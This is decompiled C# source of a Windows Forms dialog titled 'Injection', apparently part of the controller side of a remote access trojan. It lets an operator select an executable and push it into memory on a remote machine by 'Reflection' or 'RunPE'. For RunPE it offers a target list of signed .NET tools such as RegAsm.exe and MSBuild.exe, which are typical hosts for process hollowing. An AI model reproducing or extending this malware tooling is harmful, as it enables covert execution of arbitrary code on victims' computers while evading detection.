using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Helper;

namespace Server;

public class FormSendFileToMemory : Form
{
	public bool IsOK;

	private IContainer components;

	private GroupBox groupBox1;

	private Button button1;

	private Label label2;

	private Label label1;

	public ComboBox comboBox1;

	private Button button2;

	private StatusStrip statusStrip1;

	public ToolStripStatusLabel toolStripStatusLabel1;

	private Label label3;

	public ComboBox comboBox2;

	private Button button3;

	public FormSendFileToMemory()
	{
		InitializeComponent();
	}

	private void SendFileToMemory_Load(object sender, EventArgs e)
	{
		((ListControl)comboBox1).set_SelectedIndex(0);
		((ListControl)comboBox2).set_SelectedIndex(0);
	}

	private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
		switch (((ListControl)comboBox1).get_SelectedIndex())
		{
		case 1:
			((Control)label3).set_Visible(true);
			((Control)comboBox2).set_Visible(true);
			break;
		case 0:
			((Control)label3).set_Visible(false);
			((Control)comboBox2).set_Visible(false);
			break;
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Invalid comparison between Unknown and I4
		OpenFileDialog val = new OpenFileDialog();
		try
		{
			((FileDialog)val).set_Filter("(*.exe)|*.exe");
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				((ToolStripItem)toolStripStatusLabel1).set_Text(Path.GetFileName(((FileDialog)val).get_FileName()));
				((ToolStripItem)toolStripStatusLabel1).set_Tag((object)((FileDialog)val).get_FileName());
				((ToolStripItem)toolStripStatusLabel1).set_ForeColor(Color.Green);
				IsOK = true;
				if (((ListControl)comboBox1).get_SelectedIndex() == 0)
				{
					try
					{
						new ReferenceLoader().AppDomainSetup(((FileDialog)val).get_FileName());
						IsOK = true;
						return;
					}
					catch
					{
						((ToolStripItem)toolStripStatusLabel1).set_ForeColor(Color.Red);
						ToolStripStatusLabel obj = toolStripStatusLabel1;
						((ToolStripItem)obj).set_Text(((ToolStripItem)obj).get_Text() + " Invalid!");
						IsOK = false;
						return;
					}
				}
			}
			else
			{
				((ToolStripItem)toolStripStatusLabel1).set_Text("");
				((ToolStripItem)toolStripStatusLabel1).set_ForeColor(Color.Black);
				IsOK = true;
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		if (IsOK)
		{
			((Control)this).Hide();
		}
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		IsOK = false;
		((Control)this).Hide();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_0142: Unknown result type (might be due to invalid IL or missing references)
		//IL_0163: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0260: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0352: Unknown result type (might be due to invalid IL or missing references)
		//IL_040d: Unknown result type (might be due to invalid IL or missing references)
		//IL_04af: Unknown result type (might be due to invalid IL or missing references)
		//IL_0521: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_069c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0791: Unknown result type (might be due to invalid IL or missing references)
		//IL_079b: Expected O, but got Unknown
		//IL_079d: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(FormSendFileToMemory));
		groupBox1 = new GroupBox();
		button1 = new Button();
		label2 = new Label();
		label3 = new Label();
		label1 = new Label();
		comboBox2 = new ComboBox();
		comboBox1 = new ComboBox();
		button2 = new Button();
		statusStrip1 = new StatusStrip();
		toolStripStatusLabel1 = new ToolStripStatusLabel();
		button3 = new Button();
		((Control)groupBox1).SuspendLayout();
		((Control)statusStrip1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)groupBox1).get_Controls().Add((Control)(object)button1);
		((Control)groupBox1).get_Controls().Add((Control)(object)label2);
		((Control)groupBox1).get_Controls().Add((Control)(object)label3);
		((Control)groupBox1).get_Controls().Add((Control)(object)label1);
		((Control)groupBox1).get_Controls().Add((Control)(object)comboBox2);
		((Control)groupBox1).get_Controls().Add((Control)(object)comboBox1);
		((Control)groupBox1).set_Location(new Point(8, 7));
		((Control)groupBox1).set_Margin(new Padding(2));
		((Control)groupBox1).set_Name("groupBox1");
		((Control)groupBox1).set_Padding(new Padding(2));
		((Control)groupBox1).set_Size(new Size(213, 110));
		((Control)groupBox1).set_TabIndex(0);
		groupBox1.set_TabStop(false);
		((Control)groupBox1).set_Text("Inject");
		((Control)button1).set_Location(new Point(75, 50));
		((Control)button1).set_Margin(new Padding(2));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(135, 20));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("Select");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(4, 54));
		((Control)label2).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(35, 12));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("File:");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(4, 85));
		((Control)label3).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(47, 12));
		((Control)label3).set_TabIndex(1);
		((Control)label3).set_Text("Target:");
		((Control)label3).set_Visible(false);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(4, 22));
		((Control)label1).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(35, 12));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Type:");
		comboBox2.set_DropDownStyle((ComboBoxStyle)2);
		((ListControl)comboBox2).set_FormattingEnabled(true);
		comboBox2.get_Items().AddRange(new object[5] { "aspnet_compiler.exe", "RegAsm.exe", "MSBuild.exe", "RegSvcs.exe", "vbc.exe" });
		((Control)comboBox2).set_Location(new Point(75, 83));
		((Control)comboBox2).set_Margin(new Padding(2));
		((Control)comboBox2).set_Name("comboBox2");
		((Control)comboBox2).set_Size(new Size(135, 20));
		((Control)comboBox2).set_TabIndex(1);
		((Control)comboBox2).set_Visible(false);
		comboBox1.set_DropDownStyle((ComboBoxStyle)2);
		((ListControl)comboBox1).set_FormattingEnabled(true);
		comboBox1.get_Items().AddRange(new object[2] { "Reflection", "RunPE" });
		((Control)comboBox1).set_Location(new Point(75, 20));
		((Control)comboBox1).set_Margin(new Padding(2));
		((Control)comboBox1).set_Name("comboBox1");
		((Control)comboBox1).set_Size(new Size(135, 20));
		((Control)comboBox1).set_TabIndex(1);
		comboBox1.add_SelectedIndexChanged((EventHandler)comboBox1_SelectedIndexChanged);
		((Control)button2).set_Location(new Point(15, 132));
		((Control)button2).set_Margin(new Padding(2));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(59, 18));
		((Control)button2).set_TabIndex(1);
		((Control)button2).set_Text("OK");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((ToolStrip)statusStrip1).set_ImageScalingSize(new Size(24, 24));
		((ToolStrip)statusStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)toolStripStatusLabel1 });
		((Control)statusStrip1).set_Location(new Point(0, 162));
		((Control)statusStrip1).set_Name("statusStrip1");
		statusStrip1.set_Padding(new Padding(1, 0, 9, 0));
		((Control)statusStrip1).set_Size(new Size(234, 22));
		statusStrip1.set_SizingGrip(false);
		((Control)statusStrip1).set_TabIndex(2);
		((Control)statusStrip1).set_Text("statusStrip1");
		((ToolStripItem)toolStripStatusLabel1).set_DisplayStyle((ToolStripItemDisplayStyle)1);
		((ToolStripItem)toolStripStatusLabel1).set_Name("toolStripStatusLabel1");
		((ToolStripItem)toolStripStatusLabel1).set_Size(new Size(17, 17));
		((ToolStripItem)toolStripStatusLabel1).set_Text("...");
		((Control)button3).set_Location(new Point(162, 132));
		((Control)button3).set_Margin(new Padding(2));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(59, 18));
		((Control)button3).set_TabIndex(3);
		((Control)button3).set_Text("CANCEL");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)Button3_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(234, 184));
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)statusStrip1);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)groupBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(2));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("FormSendFileToMemory");
		((Form)this).set_StartPosition((FormStartPosition)4);
		((Control)this).set_Text("Injection");
		((Form)this).add_Load((EventHandler)SendFileToMemory_Load);
		((Control)groupBox1).ResumeLayout(false);
		((Control)groupBox1).PerformLayout();
		((Control)statusStrip1).ResumeLayout(false);
		((Control)statusStrip1).PerformLayout();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
